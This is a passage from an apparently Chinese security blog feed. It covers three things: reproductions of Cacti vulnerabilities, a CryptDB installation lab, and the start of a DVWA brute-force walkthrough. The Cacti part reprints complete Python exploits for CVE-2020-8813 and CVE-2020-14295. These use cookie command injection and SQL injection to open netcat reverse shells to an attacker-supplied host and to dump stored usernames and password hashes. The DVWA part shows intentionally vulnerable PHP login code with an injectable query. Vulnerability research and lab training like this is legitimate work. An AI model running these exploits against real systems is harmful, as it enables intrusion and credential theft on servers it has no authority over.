class="line">    request_info = {</span><br><span class="line">    <span class="string">"id"</span>: <span class="string">"3"</span>,</span><br><span class="line">    <span class="string">"section25"</span>: <span class="string">"on"</span>,</span><br><span class="line">    <span class="string">"section7"</span>: <span class="string">"on"</span>,</span><br><span class="line">    <span class="string">"tab"</span>: <span class="string">"realms"</span>,</span><br><span class="line">    <span class="string">"save_component_realm_perms"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"save"</span>,</span><br><span class="line">    <span class="string">"__csrf_magic"</span>: token</span><br><span class="line">    }</span><br><span class="line">    enable_request = request.post(url+<span class="string">"/user_admin.php?header=false"</span>, request_info)</span><br><span class="line">    <span class="keyword">if</span> enable_request:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_exploit</span>():</span><br><span class="line">    payload = <span class="string">";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s"</span> % (ip, port)</span><br><span class="line">    cookies = {<span class="string">'Cacti'</span>: quote(payload)}</span><br><span class="line">    requests.get(url+<span class="string">"/graph_realtime.php?action=init"</span>, cookies=cookies)</span><br><span class="line"></span><br><span class="line">request = requests.session()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+]Retrieving login CSRF token"</span>)</span><br><span class="line">page = request.get(url+<span class="string">"/index.php"</span>)</span><br><span class="line">html_content = page.text</span><br><span class="line">soup = BeautifulSoup(html_content, <span class="string">"html5lib"</span>)</span><br><span class="line">token = soup.findAll(<span class="string">'input'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</span><br><span class="line"><span class="keyword">if</span> token:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+]Token Found : %s"</span> % token)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+]Sending creds .."</span>)</span><br><span class="line">    login_status = login(token)</span><br><span class="line">    <span class="keyword">if</span> login_status:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+]Successfully LoggedIn"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+]Retrieving CSRF token .."</span>)</span><br><span class="line">        page = request.get(url+<span class="string">"/user_admin.php?action=user_edit&amp;id=3&amp;tab=realms"</span>)</span><br><span class="line">        html_content = page.text</span><br><span class="line">        soup = BeautifulSoup(html_content, <span class="string">"html5lib"</span>)</span><br><span class="line">        token = soup.findAll(<span class="string">'input'</span>)[<span class="number">1</span>].get(<span class="string">"value"</span>)</span><br><span class="line">        <span class="keyword">if</span> token:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[+]Making some noise .."</span>)</span><br><span class="line">            guest_realtime = enable_guest(token)</span><br><span class="line">            <span class="keyword">if</span> guest_realtime:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"[+]Sending malicous request, check your nc ;)"</span>)</span><br><span class="line">                send_exploit()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"[-]Error while activating the malicous account"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[-] Unable to retrieve CSRF token from admin page!"</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[-]Cannot Login!"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[-] Unable to retrieve CSRF token!"</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>POC2，系统开启访客模式，不需要账号认证</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 03/02/2020</span></span><br><span class="line"><span class="comment"># Exploit Author: Askar (@mohammadaskar2)</span></span><br><span class="line"><span class="comment"># CVE: CVE-2020-8813</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://cacti.net/</span></span><br><span class="line"><span class="comment"># Version: v1.2.8</span></span><br><span class="line"><span class="comment"># Tested on: CentOS 7.3 / PHP 7.1.33</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">"ignore"</span>, category=UserWarning, module=<span class="string">'bs4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[~] Usage : ./Cacti-exploit.py url ip port"</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">ip = sys.argv[<span class="number">2</span>]</span><br><span class="line">port = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_exploit</span>(<span class="params">url</span>):</span><br><span class="line">    payload = <span class="string">";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s"</span> % (ip, port)</span><br><span class="line">    cookies = {<span class="string">'Cacti'</span>: quote(payload)}</span><br><span class="line">    path = url+<span class="string">"/graph_realtime.php?action=init"</span></span><br><span class="line">    req = requests.get(path)</span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">"poller_realtime.php"</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+] File Found and Guest is enabled!"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+] Sending malicous request, check your nc ;)"</span>)</span><br><span class="line">        requests.get(path, cookies=cookies)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+] Error while requesting the file!"</span>)</span><br><span class="line"></span><br><span class="line">send_exploit(url)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="【CVE-2020-14295】Cacti-SQL注入漏洞"><a href="#【CVE-2020-14295】Cacti-SQL注入漏洞" class="headerlink" title="【CVE-2020-14295】Cacti SQL注入漏洞"></a>【CVE-2020-14295】Cacti SQL注入漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Cacti 1.2.12版本中的color.php文件存在SQL注入漏洞。远程攻击者可借助‘filter’参数利用该漏洞执行任意命令。</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Cacti &lt; 1.2.13</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>登录测试环境的，访问如下链接<code>/cacti/color.php?action=export&amp;header=false&amp;filter=%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+user_auth+set+username=%27sqli%27+where+id=3;--+-</code>，下载color.csv，内容包括用户名和密码。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912231530.png"></p>
<p>POC如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Cacti 1.2.12 - 'filter' SQL Injection / Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 04/28/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: Leonardo Paiva</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.cacti.net/</span></span><br><span class="line"><span class="comment"># Software Link: https://www.cacti.net/downloads/cacti-1.2.12.tar.gz</span></span><br><span class="line"><span class="comment"># Version: 1.2.12</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 20.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2020-14295</span></span><br><span class="line"><span class="comment"># Credits: @M4yFly (https://twitter.com/M4yFly)</span></span><br><span class="line"><span class="comment"># References:</span></span><br><span class="line"><span class="comment"># https://github.commandcom/Cacti/cacti/issues/3622</span></span><br><span class="line"><span class="comment"># https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14295</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = {'http': 'http://127.0.0.1:8080'}</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">url, username, password, session</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+] Connecting to the server..."</span>)</span><br><span class="line">    get_token_request = session.get(url + <span class="string">"/cacti/index.php"</span>, timeout=<span class="number">5</span>) <span class="comment">#, proxies=proxies)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+] Retrieving CSRF token..."</span>)</span><br><span class="line">    html_content = get_token_request.text</span><br><span class="line">    soup = BeautifulSoup(html_content, <span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="built_in">print</span>(soup)</span><br><span class="line">    csrf_token = soup.find_all(<span class="string">'input'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>).split(<span class="string">';'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> csrf_token:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[+] Got CSRF token: <span class="subst">{csrf_token}</span>"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+] Trying to log in..."</span>)</span><br><span class="line"></span><br><span class="line">        data = {</span><br><span class="line">            <span class="string">'__csrf_magic'</span>: csrf_token,</span><br><span class="line">            <span class="string">'action'</span>: <span class="string">'login'</span>,</span><br><span class="line">            <span class="string">'login_username'</span>: username,</span><br><span class="line">            <span class="string">'login_password'</span>: password</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        login_request = session.post(url + <span class="string">"/cacti/index.php"</span>, data=data) <span class="comment">#, proxies=proxies)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Invalid User Name/Password Please Retype"</span> <span class="keyword">in</span> login_request.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[-] Unable to log in. Check your credentials"</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[+] Successfully logged in!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[-] Unable to retrieve CSRF token!"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">lhost, lport, session</span>):</span><br><span class="line">    rshell = urllib.parse.quote(<span class="string">f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc <span class="subst">{lhost}</span> <span class="subst">{lport}</span> &gt;/tmp/f"</span>)</span><br><span class="line">    payload = <span class="string">f"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='<span class="subst">{rshell}</span>;'+where+name='path_php_binary';--+-"</span></span><br><span class="line"></span><br><span class="line">    exploit_request = session.get(url + <span class="string">f"/cacti/color.php?action=export&amp;header=false&amp;filter=1<span class="subst">{payload}</span>"</span>) <span class="comment">#, proxies=proxies)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n[+] SQL Injection:"</span>)</span><br><span class="line">    <span class="built_in">print</span>(exploit_request.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session.get(url + <span class="string">"/cacti/host.php?action=reindex"</span>, timeout=<span class="number">1</span>) <span class="comment">#, proxies=proxies)</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+] Check your nc listener!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'[*] Cacti 1.2.12 - SQL Injection / Remote Code Execution'</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-t'</span>, metavar=<span class="string">'&lt;target/host URL&gt;'</span>, <span class="built_in">help</span>=<span class="string">'target/host URL, example: http://192.168.15.58'</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, metavar=<span class="string">'&lt;user&gt;'</span>, <span class="built_in">help</span>=<span class="string">'user to log in'</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, metavar=<span class="string">'&lt;password&gt;'</span>, <span class="built_in">help</span>=<span class="string">"user's password"</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--lhost'</span>, metavar=<span class="string">'&lt;lhost&gt;'</span>, <span class="built_in">help</span>=<span class="string">'your IP address'</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--lport'</span>, metavar=<span class="string">'&lt;lport&gt;'</span>, <span class="built_in">help</span>=<span class="string">'your listening port'</span>, required=<span class="literal">True</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    url = args.t</span><br><span class="line">    username = args.u</span><br><span class="line">    password = args.p</span><br><span class="line">    lhost = args.lhost</span><br><span class="line">    lport = args.lport</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    login(url, username, password, session)</span><br><span class="line">    exploit(lhost, lport, session)</span><br></pre></td></tr></table></figure>

<p>测试POC，成功执行命令</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912231645.png"></p>
<p>Cacti近几年爆出的漏洞挺多，但是只有以上两个能搜索到POC，其他均无可利用的POC</p>
<p><strong>注：仅当作技术研究，请勿用于非法用途 后果作者概不负责！！！</strong></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞 Cacti</tag>
      </tags>
  </entry>
  <entry>
    <title>CryptDB安装与使用</title>
    <url>/CryptDB%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>通过对CryptDB的安装和使用，了解学习加密数据库查询技术的原理和实现方式.</p>
<span id="more"></span>

<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ul>
<li>操作系统：ubuntu 12.04</li>
<li>工具：CryptDB、git、ruby</li>
</ul>
<h1 id="CryptDB简介"><a href="#CryptDB简介" class="headerlink" title="CryptDB简介"></a>CryptDB简介</h1><ul>
<li><p>CryptDB 是来自MIT的一个开源项目，它不是某种数据库，而是加密数据库查询技术的一种，可以在加密的数据库（目前支持MySQL）上进行简单的操作。正常说来， 一个应用是直接连接数据库的，配置了CryptDB后，CryptDB作为应用和数据库的中间代理，以明文的方式与应用交互，以密文的方式与数据库交互。</p>
</li>
<li><p>CryptDB首次解决了实用性的问题，它将数据嵌套进多个加密层，每层使用不同的密钥，这些加密密钥与用户的密码有关，即便是数据库管理员也不能访问这些加密的数据，这也防止了因数据库泄露导致用户信息泄露的问题。虽然目前支持的SQL语句有限，还没有到真正投入使用的程度，但其性却非常出众。Google也根据CryptDB的设计开发了Encrypted BigQuery client。 </p>
</li>
<li><p>CryptDB官网的介绍如下</p>
<blockquote>
<p>Online applications are vulnerable to theft of sensitive information  because adversaries can exploit software bugs to gain access to private  data, and because curious or malicious administrators may capture and  leak data. CryptDB is a system that provides practical and provable  confidentiality in the face of these attacks for applications backed by  SQL databases. It works by executing SQL queries over encrypted data  using a collection of efficient SQL-aware encryption schemes. CryptDB  can also chain encryption keys to user passwords, so that a data item  can be decrypted only by using the password of one of the users with  access to that data. As a result, a database administrator never gets  access to decrypted data, and even if all servers are compromised, an  adversary cannot decrypt the data of any user who is not logged in. An  analysis of a trace of 126 million SQL queries from a production MySQL  server shows that CryptDB can support operations over encrypted data for 99.5% of the 128,840 columns seen in the trace. Our evaluation shows  that CryptDB has low overhead, reducing throughput by 14.5% for phpBB, a web forum application, and by 26% for queries from TPC-C, compared to  unmodified MySQL. Chaining encryption keys to user passwords requires  11-13 unique schema annotations to secure more than 20 sensitive fields  and 2-7 lines of source code changes for three multi-user web  applications. </p>
</blockquote>
</li>
</ul>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="CryptDB安装"><a href="#CryptDB安装" class="headerlink" title="CryptDB安装"></a>CryptDB安装</h2><ol>
<li><p>安装Ubuntu系统</p>
<p>CryptDB依附于ubuntu系统，本次实验使用的是12.04版本的系统，已经安装完毕；</p>
</li>
<li><p>安装git和ruby</p>
<p>安装git是为了获取官网的源码；</p>
<p>安装ruby是因为CryptDB的安装脚本使用ruby语言编写；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install git ruby</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212011701.png"></p>
</li>
<li><p>克隆CryptDB代码</p>
<p>把CryptDB项目克隆到了主目录下，后续步骤中也会安装到这个目录；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> -b public git://g.csail.mit.edu/cryptdb</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212012233.png"></p>
</li>
<li><p>安装CryptDB</p>
<p>进入到cryptdb文件夹，执行安装脚本，按照提示，等待完成。</p>
<p>在此过程中会要求设置mysql密码，因后续过程需要mysql和CryptDB密码相同，所以在此设置了mysql密码为CryptDB默认密码letmein；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> cryptdb</span><br><span class="line">$ ./scripts/install.rb .</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212012327.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212014946.png"></p>
</li>
<li><p>添加环境变量<code>EDBDIR</code>到<code>.bashrc</code></p>
<p>编辑<code>cryptdb/</code><strong>同</strong>目录下的<code>.bashrc</code>，把下面的代码添加到最后；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export EDBDIR=/home/levi/cryptdb/</span><br></pre></td></tr></table></figure>

<p>至此，安装完成，重启设备即可使用CryptDB；</p>
</li>
</ol>
<h2 id="CryptDB使用"><a href="#CryptDB使用" class="headerlink" title="CryptDB使用"></a>CryptDB使用</h2><p>本实验中准备了3个终端：</p>
<ul>
<li><code>终端1</code>：用于运行CryptDB，在上面显示密文；</li>
<li><code>终端2</code>：用于从代理端口3306访问数据库，显示用户实际操作状态；</li>
<li><code>终端3</code>：用于从正常端口访问数据库，显示明文；</li>
</ul>
<h3 id="启用proxy"><a href="#启用proxy" class="headerlink" title="启用proxy"></a>启用proxy</h3><p>MySQL使用本地<code>3306</code>端口，CryptDB使用本地<code>3307</code>端口，CryptDB把<code>3307</code>端口的数据处理后通过<code>3306</code>端口与MySQL交互；</p>
<p>在<code>终端1</code>中输入如下内容，系统返回<code>started</code>即为执行成功；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /home/levi/cryptdb/bins/proxy-bin/bin/mysql-proxy  \</span><br><span class="line">   --plugins=proxy --event-threads=4             \</span><br><span class="line">   --max-open-files=1024                         \</span><br><span class="line">   --proxy-lua-script=<span class="variable">$EDBDIR</span>/mysqlproxy/wrapper.lua \</span><br><span class="line">   --proxy-address=127.0.0.1:3307                \</span><br><span class="line">   --proxy-backend-addresses=localhost:3306</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212102340.png"></p>
<h3 id="启用CryptDB和mysql"><a href="#启用CryptDB和mysql" class="headerlink" title="启用CryptDB和mysql"></a>启用CryptDB和mysql</h3><ol>
<li><p>在<code>终端2</code>中输入如下命令，连接到本机<code>3306</code>端口的mysql；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql -u root -p -h 127.0.0.1 -P 3306</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212103018.png"></p>
<p>在<code>终端3</code>中输入如下命令，连接到本机<code>3307</code>端口的CryptDB；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql -u root -p -h 127.0.0.1 -P 3307</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212103110.png"></p>
</li>
</ol>
<h3 id="CryptDB使用演示"><a href="#CryptDB使用演示" class="headerlink" title="CryptDB使用演示"></a>CryptDB使用演示</h3><ol>
<li><p>在<code>终端3</code>中查询数据库<code>show databases;</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110349.png"></p>
<p>此时在<code>终端1</code>中显示CryptDB查询数据库的结果；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110435.png"></p>
</li>
<li><p>在<code>终端3</code>中创建数据库名称为<code>leeyuxun</code> <code>create database leeyuxun;</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110729.png"></p>
<p>此时在<code>终端1</code>中显示CryptDB创建数据库<code>leeyuxun</code>的结果；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110809.png"></p>
</li>
<li><p>在<code>终端3</code>中打开数据库<code>leeyuxun</code> <code>use leeyuxun;</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212110948.png"></p>
<p>此时在<code>终端1</code>中显示CryptDB打开数据库的结果；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212111247.png"></p>
</li>
<li><p>在<code>终端3</code>中新建表<code>users</code>；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table users(id int(2) not null primary key auto_increment,username varchar(40),password varchar(40));</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212111446.png"></p>
<p>此时在<code>终端1</code>中显示CryptDB新建表<code>users</code>的结果；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212111743.png"></p>
</li>
<li><p>在<code>终端3</code>中的<code>users</code>表中增加数据；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users(username,password) values(&quot;lizhilin&quot;,&quot;123456&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212112018.png"></p>
<p>此时在<code>终端1</code>中显示CryptDB的<code>users</code>表增加数据的结果；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212112100.png"></p>
</li>
<li><p>在<code>终端3</code>中查询表<code>users</code>中的记录<code>select * from users;</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212112247.png"></p>
<p>此时在<code>终端1</code>中显示CryptDB的<code>users</code>表查询记录的结果；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212112402.png"></p>
</li>
<li><p>在<code>终端1</code>中发现新创建的<code>users</code>表在Mysql中储存的名字为<code>table_CIGLJIQNCC</code>，在<code>终端2</code>中查询以此命名的表，发现储存数据为密文，表明数据在Mysql端是加密的；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212113558.png"></p>
</li>
</ol>
<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><h3 id="修改CryptDB密码"><a href="#修改CryptDB密码" class="headerlink" title="修改CryptDB密码"></a>修改CryptDB密码</h3><p>输入如下语句即可更改CryptDB的密码；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo xdg-open /home/levi/cryptdb/mysqlproxy/wrapper.lua</span><br></pre></td></tr></table></figure>

<p>更换<code>letmein</code>为其他密码即可；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212114915.png"></p>
<h3 id="修改mysql密码"><a href="#修改mysql密码" class="headerlink" title="修改mysql密码"></a>修改mysql密码</h3><p>输入如下语句并按提示输入当前密码，要更改的密码，并确认密码；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysqladmin -u root -p password</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212115503.png"></p>
]]></content>
      <categories>
        <category>大数据安全实验</category>
      </categories>
      <tags>
        <tag>CryptDB</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA Brute Force</title>
    <url>/DVWA-Brute-Force.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>暴力破解是利用大量的用户名和字典，去对账号进行暴力破解，弱密码可能是永远都无法防御的点；<span id="more"></span></p>
<p>DVWA 没模拟验证码缺陷的相关漏洞，在实战中，会遇到很多验证码无效的案例；</p>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">'Login'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Get username</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">'username'</span> ];</span><br><span class="line">        <span class="comment">// Get password</span></span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">'password'</span> ];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">"SELECT * FROM `users` WHERE user = '<span class="subst">$user</span>' AND password = '<span class="subst">$pass</span>';"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) {</span><br><span class="line">            <span class="comment">// Get users details</span></span><br><span class="line">            <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">            <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">"avatar"</span>];</span><br><span class="line">            <span class="comment">// Login successful</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area <span class="subst">{$user}</span>&lt;/p&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;img src=\"<span class="subst">{$avatar}</span>\" /&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Login failed</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span 